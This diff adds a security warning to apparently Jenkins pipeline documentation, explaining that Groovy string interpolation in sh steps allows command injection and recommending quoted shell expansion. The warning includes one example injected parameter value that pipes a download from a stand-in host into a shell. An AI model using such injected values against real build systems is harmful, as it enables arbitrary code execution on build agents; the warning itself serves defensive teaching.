@@ -66,6 +66,8 @@ sh """
 """
 ```
 
+> ⚠️ **Injection warning for the last example.** In a triple-double-quoted string, **Groovy** pastes `params.IMAGE` into the script **before** the shell runs. Anyone who can start the build can set `IMAGE` to `x . ; curl evil.sh | sh #` and run any command on the agent (topic 37). Let the **shell** expand the value instead, and quote it: `sh 'docker build -t "$IMAGE:$BUILD_NUMBER" .'` (parameters are also environment variables). Use Groovy interpolation only for values your pipeline controls.
+
 All Jenkins environment variables (built-in ones, `environment {}` ones, `withCredentials` ones) are **also shell environment variables** in `sh` steps. So the shell can expand them, and single quotes are usually the safest choice.
 
 ### Variables
